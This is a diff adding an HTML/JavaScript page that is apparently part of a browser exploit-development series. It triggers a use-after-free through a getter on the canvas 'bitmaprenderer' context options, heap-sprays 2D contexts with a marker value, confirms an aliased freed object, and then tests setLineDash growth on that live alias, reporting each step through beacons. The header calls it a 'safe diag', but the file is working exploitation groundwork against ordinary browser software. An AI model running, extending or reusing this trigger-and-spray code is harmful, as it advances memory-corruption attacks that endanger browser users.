@@ -1,0 +1,118 @@
+<!DOCTYPE html>
+<html><head><meta charset="utf-8">
+<meta http-equiv="Cache-Control" content="no-cache,no-store,must-revalidate">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>V928B</title></head>
+<body><pre id="out">V928B — lineDash growth on live alias (safe diag, B-session)</pre>
+<script>
+'use strict';
+var O=document.getElementById('out');
+function say(s){O.textContent+='\n'+s;}
+function bk(tag,body){
+  try{new Image().src='/beacon/V928B-'+tag+'?d='+encodeURIComponent(String(body).slice(0,500))+'&t='+Date.now()+'&s=1';}catch(e){}
+}
+function eqArr(a,b){
+  if(!a||!b||a.length!==b.length) return false;
+  for(var i=0;i<a.length;i++){ if(a[i]!==b[i]) return false; }
+  return true;
+}
+function makeDash(n){
+  var a=new Array(n);
+  for(var i=0;i<n;i++) a[i]= (i+1) + ((i%3)===0 ? 0.5 : 0); /* mix ints/floats */
+  return a;
+}
+
+var P=new URLSearchParams(location.search);
+var NSAVES=+(P.get('saves')||'32');
+var NSPRAY=+(P.get('spray')||'300');
+var MARKER=+(P.get('marker')||'7777.77');
+
+bk('BOOT','saves='+NSAVES+',spray='+NSPRAY+',marker='+MARKER);
+say('BOOT');
+
+/* UAF (V573 pattern) */
+var innerCtx=null;
+(function(){
+  var c=document.createElement('canvas'); c.width=1; c.height=1;
+  var d={};
+  Object.defineProperty(d,'alpha',{get:function(){
+    var ctx=c.getContext('2d'); innerCtx=ctx;
+    for(var s=0;s<NSAVES;s++) ctx.save();
+    ctx.lineWidth=1.0; return true;
+  }});
+  try{ c.getContext('bitmaprenderer',d); }catch(e){ bk('TRIG-ERR',e.message); }
+})();
+bk('POST-UAF','ctx='+(innerCtx?'OK':'NULL'));
+if(!innerCtx){ bk('FAIL','no-inner'); say('FAIL'); }
+
+/* same-type spray */
+var sprayCtxs=[];
+for(var i=0;i<NSPRAY;i++){
+  var sc=document.createElement('canvas'); sc.width=1; sc.height=1;
+  var sctx=sc.getContext('2d');
+  if(sctx){ sctx.lineWidth=MARKER; sprayCtxs.push(sctx); }
+}
+bk('SPRAY','n='+sprayCtxs.length);
+
+/* confirm alias */
+var lwR, aliasCtx=null, aliasIdx=-1, errR;
+try { lwR=innerCtx.lineWidth; } catch(e){ errR='lw:'+e.message; }
+if(errR){ bk('READ','ERR:'+String(errR).slice(0,200)); say('READ ERR '+errR); }
+else {
+  bk('READ','lw='+lwR);
+  if(lwR===MARKER){
+    bk('RECLAIM','CONFIRMED');
+    try{ innerCtx.lineWidth=9999.99; }catch(e){}
+    for(var i=0;i<sprayCtxs.length;i++){
+      try{ if(sprayCtxs[i].lineWidth===9999.99){ aliasCtx=sprayCtxs[i]; aliasIdx=i; break; } }catch(e){}
+    }
+    bk('ALIAS','idx='+aliasIdx+',found='+(aliasCtx?'1':'0'));
+    say('ALIAS idx='+aliasIdx);
+  } else {
+    bk('RECLAIM','NO-marker lw='+lwR);
+  }
+}
+
+/* SAFE growth test on LIVE alias */
+var live = aliasCtx || innerCtx;
+var sizes = [0,2,8,32,64,128,256,512,1024];
+function testSize(n){
+  var seq = (n===0)?[]:makeDash(n);
+  try{
+    bk('SZ-PRE','n='+n);
+    live.setLineDash(seq);
+    var got = live.getLineDash();
+    var ok = eqArr(seq, got);
+    bk('SZ','n='+n+'|len='+got.length+'|ok='+ok);
+    say('SZ n='+n+' ok='+ok+' len='+got.length);
+    return ok;
+  }catch(e){
+    bk('SZ-ERR','n='+n+'|'+e.name+':'+String(e.message).slice(0,120));
+    say('SZ-ERR n='+n+' '+e.message);
+    return false;
+  }
+}
+
+if(live){
+  bk('GROW-START','target='+(aliasCtx?'alias-spray#'+aliasIdx:'innerCtx')+',sizes='+sizes.join(','));
+  var allOk=true;
+  for(var k=0;k<sizes.length;k++){ if(!testSize(sizes[k])) allOk=false; }
+  try{ live.setLineDash([]); }catch(e){}
+  bk('GROW-DONE','allOk='+allOk);
+  say('GROW-DONE allOk='+allOk);
+  /* cross-check still holds after growth/clear */
+  try{
+    if(aliasCtx && innerCtx){
+      innerCtx.setLineDash([7,6,5]);
+      var g1=innerCtx.getLineDash(), g2=aliasCtx.getLineDash();
+      bk('XCHK','eq='+eqArr(g1,g2)+'|len='+g1.length);
+    }
+  }catch(e){ bk('XCHK-ERR',e.message); }
+} else {
+  bk('GROW-SKIP','no-live-ctx');
+}
+
+bk('DONE','complete');
+say('\nV928B complete.');
+</script>
+</body></html>
